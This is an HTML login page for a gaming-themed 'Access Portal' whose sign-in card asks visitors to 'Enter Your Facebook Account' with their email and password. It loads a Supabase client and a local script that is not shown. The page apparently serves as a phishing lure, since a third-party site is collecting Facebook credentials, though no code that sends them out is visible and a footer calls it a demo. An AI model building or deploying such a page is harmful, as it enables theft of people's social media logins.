<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Access Portal - Login</title>
  <link rel="stylesheet" href="/frontend/style.css">
</head>
<body>
  <main class="login-page">
    <section class="brand-panel" aria-label="Brand message">
      <div class="brand-content">
        <p>Connect with your squad and enter the next arena.</p>
        <div class="status-strip" aria-hidden="true">
          <span>ONLINE</span>
          <span>SECURE PORTAL</span>
          <span>PLAYER READY</span> 
        </div>
      </div>
    </section>

    <section class="auth-panel" aria-label="Authentication">
      <div class="login-card">
        <div class="portal-badge" aria-hidden="true">VX</div>
        <div class="card-heading">
          <p>Welcome Player</p>
          <h2>Enter Your Facebook Account</h2>
        </div>

        <form id="loginForm" novalidate>
          <label class="sr-only" for="email">Enter Email</label>
          <input id="email" name="email" type="email" placeholder="Enter Email" autocomplete="email">

          <label class="sr-only" for="password">Enter Password</label>
          <input id="password" name="password" type="password" placeholder="Enter Password" autocomplete="current-password">

          <button id="loginButton" class="login-button" type="submit">
            <span class="spinner" aria-hidden="true"></span>
            <span class="button-label">Sign In</span>
          </button>
          <p id="formMessage" class="form-message" role="status" aria-live="polite"></p>
        </form>

        <a class="forgot-link" href="#">Forgot password?</a>

        <div class="divider" aria-hidden="true">
          <span></span>
          <strong>or</strong>
          <span></span>
        </div>

        <button id="signupButton" class="signup-button" type="button">Create Account</button>
      </div>

      <p class="page-note"><strong>Login System</strong> demo portal interface.</p>
    </section>
  </main>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
  <script src="./frontend/script.js"></script>
</body>
</html>
